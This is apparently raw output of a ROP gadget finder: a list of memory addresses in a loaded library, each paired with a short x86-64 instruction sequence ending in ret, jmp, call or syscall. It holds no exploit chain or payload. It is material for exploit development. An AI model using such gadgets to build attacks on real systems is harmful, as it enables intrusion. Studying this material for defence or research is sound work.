0x00002aaaaab9439b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaab2c0db : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaab070db : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab7e59b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x00002aaaaabd2f7b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x3c01
0x00002aaaaac128fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4404
0x00002aaaaac48dfb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x00002aaaaabac05b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4c04
0x00002aaaaab62f3b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x6620
0x00002aaaaab62ecb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x7e20
0x00002aaaaab840db : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8301
0x00002aaaaaafa19b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8901
0x00002aaaaabbb0bb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8908
0x00002aaaaab3667b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xb908
0x00002aaaaab9449b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xf01
0x00002aaaaab73aab : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x00002aaaaab4722b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
0x00002aaaaac7c17a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; adc al, 0 ; add byte ptr [rax], al ; ret 0
0x00002aaaaac7c1c2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; adc al, 0 ; add byte ptr [rax], al ; xchg eax, esp ; ret 0
0x00002aaaaac6920a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; adc byte ptr [rax], al ; sti ; jmp rax
0x00002aaaaac5b459 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add al, al ; pop rcx ; out dx, al ; jmp rax
0x00002aaaaac5a511 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add al, bh ; loope 0x185524 ; jmp qword ptr [rdi]
0x00002aaaaac5a591 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add al, bh ; loope 0x1855a4 ; jmp qword ptr [rdi]
0x00002aaaaac5a611 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add al, bh ; loope 0x185624 ; jmp qword ptr [rdi]
0x00002aaaaabbed9d : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00002aaaaac69208 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; adc byte ptr [rax], al ; sti ; jmp rax
0x00002aaaaac932ae : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac5a510 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; clc ; loope 0x185525 ; jmp qword ptr [rdi]
0x00002aaaaac5a590 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; clc ; loope 0x1855a5 ; jmp qword ptr [rdi]
0x00002aaaaac5a610 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; clc ; loope 0x185625 ; jmp qword ptr [rdi]
0x00002aaaaac68728 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rcx ; clc ; ret 0x6e1f
0x00002aaaaac932b0 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac69209 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], dl ; add bl, bh ; jmp rax
0x00002aaaaaaed249 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], dl ; ret
0x00002aaaaac68729 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0xd], bl ; clc ; ret 0x6e1f
0x00002aaaaaaeef29 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, bl ; ret
0x00002aaaaaaeef11 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, cl ; ret
0x00002aaaaaaeef41 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret
0x00002aaaaaade3a2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; call qword ptr [rsi]
0x00002aaaaac5a512 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; clc ; loope 0x185523 ; jmp qword ptr [rdi]
0x00002aaaaac5a592 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; clc ; loope 0x1855a3 ; jmp qword ptr [rdi]
0x00002aaaaac5a612 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; clc ; loope 0x185623 ; jmp qword ptr [rdi]
0x00002aaaaac7c1da : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; je 0x1a71ed ; add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; ret 0
0x00002aaaaac6872a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rcx ; clc ; ret 0x6e1f
0x00002aaaaac68ab0 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; push rax ; pop r9 ; clc ; ret 0x6e1f
0x00002aaaaaaeeee2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pushfq ; ret
0x00002aaaaaad904a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac90faa : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0
0x00002aaaaaae345a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x16
0x00002aaaaaaf360a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x18bb
0x00002aaaaaaf0382 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x18e7
0x00002aaaaaad8fea : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x23
0x00002aaaaac52652 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x00002aaaaaadaec2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x26
0x00002aaaaaad5548 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x2800
0x00002aaaaaae5e8a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x30
0x00002aaaaaae27b2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x31
0x00002aaaaac52b42 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x33
0x00002aaaaaae0322 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x4f
0x00002aaaaaadd652 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x53
0x00002aaaaaae0532 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x56
0x00002aaaaac93792 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 1
0x00002aaaaac93412 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 3
0x00002aaaaaadc602 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 4
0x00002aaaaac91b86 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 5
0x00002aaaaaae2d9a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 6
0x00002aaaaac91a36 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 7
0x00002aaaaaaeeeca : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xchg eax, esp ; ret
0x00002aaaaab7dffb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi], ch ; ret
0x00002aaaaac6920b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], dl ; add bl, bh ; jmp rax
0x00002aaaaaaed24b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], dl ; ret
0x00002aaaaab41aab : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbp - 0x76bb7ffc], cl ; ret 0xf229
0x00002aaaaabc9fcb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbp - 0x7cb7febd], cl ; ret
0x00002aaaaac2f50b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5789fc56], cl ; cld ; ret
0x00002aaaaab0f899 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x00002aaaaabb581b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbx - 0x7af0f71a], al ; ret
0x00002aaaaac10a1b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbx - 0x7cb703b6], cl ; ret 0x4808
0x00002aaaaabb5c0b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbx - 0x7cb7fe3f], al ; ret 0x4404
0x00002aaaaabd5e4b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbx - 0x7d], dl ; call qword ptr [rcx]
0x00002aaaaac3d0fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx + 0x3518911], cl ; ret
0x00002aaaaac3d0db : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx + 0x4518811], cl ; ret
0x00002aaaaab7b18b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx + 0x4578817], cl ; ret
0x00002aaaaab7e7db : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx + 1], cl ; ret
0x00002aaaaabca38b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x3fcefb89], cl ; ret
0x00002aaaaabe453b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x4d30
0x00002aaaaac1926b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x00002aaaaab5e2eb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x00002aaaaac6872b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0xd], bl ; clc ; ret 0x6e1f
0x00002aaaaac0309b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaaba5d3b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0x4b ; add ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab4f61b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x00002aaaaaaeef2b : add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, bl ; ret
0x00002aaaaaaeef13 : add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, cl ; ret
0x00002aaaaaaeef43 : add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret
0x00002aaaaabeb81b : add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret 0x7420
0x00002aaaaab8039c : add byte ptr [rax], al ; add byte ptr [rax], al ; add rax, 3 ; ret
0x00002aaaaab2ecfc : add byte ptr [rax], al ; add byte ptr [rax], al ; add rax, rcx ; jmp rax
0x00002aaaaab22b0e : add byte ptr [rax], al ; add byte ptr [rax], al ; add rax, rsi ; jmp rax
0x00002aaaaac1874c : add byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 0x10 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaaaf6aa5 : add byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabd284c : add byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaab4ceec : add byte ptr [rax], al ; add byte ptr [rax], al ; and dword ptr [rdi], 0xffffffcf ; ret
0x00002aaaaab62f7c : add byte ptr [rax], al ; add byte ptr [rax], al ; bsf eax, eax ; add rax, rdi ; ret
0x00002aaaaac4954c : add byte ptr [rax], al ; add byte ptr [rax], al ; call qword ptr [rbx]
0x00002aaaaaade3a4 : add byte ptr [rax], al ; add byte ptr [rax], al ; call qword ptr [rsi]
0x00002aaaaac17dfc : add byte ptr [rax], al ; add byte ptr [rax], al ; call rcx
0x00002aaaaac5467c : add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x00002aaaaac5382c : add byte ptr [rax], al ; add byte ptr [rax], al ; call rsp
0x00002aaaaac5a514 : add byte ptr [rax], al ; add byte ptr [rax], al ; clc ; loope 0x185521 ; jmp qword ptr [rdi]
0x00002aaaaac5a594 : add byte ptr [rax], al ; add byte ptr [rax], al ; clc ; loope 0x1855a1 ; jmp qword ptr [rdi]
0x00002aaaaac5a614 : add byte ptr [rax], al ; add byte ptr [rax], al ; clc ; loope 0x185621 ; jmp qword ptr [rdi]
0x00002aaaaabcfc97 : add byte ptr [rax], al ; add byte ptr [rax], al ; cmova eax, edx ; ret
0x00002aaaaabdcec7 : add byte ptr [rax], al ; add byte ptr [rax], al ; cmovae rax, rsi ; ret
0x00002aaaaabab05d : add byte ptr [rax], al ; add byte ptr [rax], al ; cmove eax, esi ; ret
0x00002aaaaabd20a5 : add byte ptr [rax], al ; add byte ptr [rax], al ; cmove rax, rbx ; pop rbx ; ret
0x00002aaaaaba03ca : add byte ptr [rax], al ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x00002aaaaab6b8d6 : add byte ptr [rax], al ; add byte ptr [rax], al ; cmovne rax, rdi ; ret
0x00002aaaaabe311d : add byte ptr [rax], al ; add byte ptr [rax], al ; cmovns rax, qword ptr [rbx + 0x28] ; pop rbx ; ret
0x00002aaaaac7c1dc : add byte ptr [rax], al ; add byte ptr [rax], al ; je 0x1a71eb ; add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; ret 0
0x00002aaaaab3584e : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x5ca9d
0x00002aaaaab93b61 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0xbad97
0x00002aaaaab2de19 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp rax
0x00002aaaaac44f7c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xa] ; ret
0x00002aaaaac44f8c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xb] ; ret
0x00002aaaaac44f9c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaac44fac : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaac44fbc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaac44efc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaac44f0c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaac44f1c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaac44f2c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaac44f3c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 5] ; ret
0x00002aaaaac44f4c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 6] ; ret
0x00002aaaaac44f5c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaac44f6c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 9] ; ret
0x00002aaaaab809ec : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi - 0xc] ; ret
0x00002aaaaab80a0c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi - 4] ; ret
0x00002aaaaab809fc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi - 8] ; ret
0x00002aaaaac44eec : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi] ; ret
0x00002aaaaaaf592c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rip + 0x16b154] ; ret
0x00002aaaaaaf593c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rip + 0x16d066] ; ret
0x00002aaaaabff4fc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rip + 0x61a3e] ; ret
0x00002aaaaac5c49c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov al, 4 ; inc eax ; add al, 0xf2 ; call rax
0x00002aaaaac3f3fc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; lea rax, qword ptr [rdx] ; ret
0x00002aaaaac3b0cc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x00002aaaaac3d09c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rcx], dl ; ret
0x00002aaaaab72e8c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x00002aaaaab7b77c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; lea rax, qword ptr [rdi] ; ret
0x00002aaaaab7a17c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x00002aaaaab7b14c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dl ; ret
0x00002aaaaab7ae4c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dl, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x00002aaaaac3d0dc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rcx], edx ; mov byte ptr [rcx + 4], dl ; ret
0x00002aaaaac3d0fc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rcx], edx ; mov dword ptr [rcx + 3], edx ; ret
0x00002aaaaac3d0ec : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rcx], edx ; mov word ptr [rcx + 4], dx ; ret
0x00002aaaaac3d0cc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rcx], edx ; ret
0x00002aaaaabca38c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rdi + 4], esi ; xor eax, eax ; ret
0x00002aaaaab7b16c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rdi - 1], edx ; ret
0x00002aaaaab7b18c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rdi], edx ; mov byte ptr [rdi + 4], dl ; ret
0x00002aaaaab7b19c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rdi], edx ; mov word ptr [rdi + 4], dx ; ret
0x00002aaaaab7b17c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rdi], edx ; ret
0x00002aaaaac01d8c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rsi], 0xa ; ret
0x00002aaaaac01d7c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rsi], 0xb ; ret
0x00002aaaaac01dac : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rsi], 0xc ; ret
0x00002aaaaac01d9c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rsi], 8 ; ret
0x00002aaaaab7a18c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x00002aaaaaba168c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0x66 ; syscall ; ret
0x00002aaaaaba16ac : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0x68 ; syscall ; ret
0x00002aaaaaba169c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0x6b ; syscall ; ret
0x00002aaaaaba16bc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0x6c ; syscall ; ret
0x00002aaaaaba1e6c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0xfc17 ; ret
0x00002aaaaab4722c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00002aaaaabff45c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 1 ; pop rbx ; ret
0x00002aaaaab1f0b2 : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 1 ; ret
0x00002aaaaac024ac : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 2 ; ret
0x00002aaaaac427ec : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; mov rax, rdi ; ret
0x00002aaaaab5185c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x00002aaaaac1056c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x28] ; ret
0x00002aaaaabab65c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x4c] ; ret
0x00002aaaaabca37c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, dword ptr [rdi + 4] ; mov dword ptr [rsi], eax ; xor eax, eax ; ret
0x00002aaaaab4c42c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, dword ptr [rdi] ; and eax, 0x200 ; ret
0x00002aaaaab4c3fc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, dword ptr [rdi] ; and eax, 0x804 ; ret
0x00002aaaaab0b87c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, dword ptr [rip + 0x38c802] ; ret
0x00002aaaaab7a1bc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaabecaab : add byte ptr [rax], al ; add byte ptr [rax], al ; mov edx, dword ptr [rbx] ; jmp 0x117a7c
0x00002aaaaac2f50c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2fc2c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab22649 : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rbp - 0x4e8], rsi ; jmp rax
0x00002aaaaabe8b0e : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rbp - 0x70], rdx ; mov rdx, r13 ; call rax
0x00002aaaaac3d11c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov byte ptr [rcx + 8], dl ; ret
0x00002aaaaac3d13c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov dword ptr [rcx + 7], edx ; ret
0x00002aaaaac3d14c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov dword ptr [rcx + 8], edx ; ret
0x00002aaaaac3d15c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 5], rdx ; ret
0x00002aaaaac3d16c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 6], rdx ; ret
0x00002aaaaac3d17c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 7], rdx ; ret
0x00002aaaaac3d18c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 8], rdx ; ret
0x00002aaaaac3d12c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov word ptr [rcx + 8], dx ; ret
0x00002aaaaac3d10c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; ret
0x00002aaaaac10928 : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaab7b1ac : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi - 1], rdx ; ret
0x00002aaaaab7b1cc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov byte ptr [rdi + 8], dl ; ret
0x00002aaaaab7b1ec : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov dword ptr [rdi + 7], edx ; ret
0x00002aaaaab7b1fc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov dword ptr [rdi + 8], edx ; ret
0x00002aaaaab7b20c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov qword ptr [rdi + 5], rdx ; ret
0x00002aaaaab7b21c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov qword ptr [rdi + 6], rdx ; ret
0x00002aaaaab7b1dc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov word ptr [rdi + 8], dx ; ret
0x00002aaaaab7b1bc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaac01dca : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab51aac : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, -1 ; ret
0x00002aaaaab803bc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, 1 ; ret
0x00002aaaaab803cc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, 2 ; ret
0x00002aaaaab803dc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, 3 ; ret
0x00002aaaaab803ec : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, 4 ; ret
0x00002aaaaab803fc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, 5 ; ret
0x00002aaaaab8040c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, 6 ; ret
0x00002aaaaab8041c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, 7 ; ret
0x00002aaaaab0f71e : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rax] ; pop rbx ; mov eax, dword ptr [rax + 0x58] ; ret
0x00002aaaaab9cc9c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab49f6c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x00002aaaaab51b2c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x68] ; ret
0x00002aaaaab51b0c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x347a09] ; ret
0x00002aaaaaaf6a4c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x3a68b9] ; ret
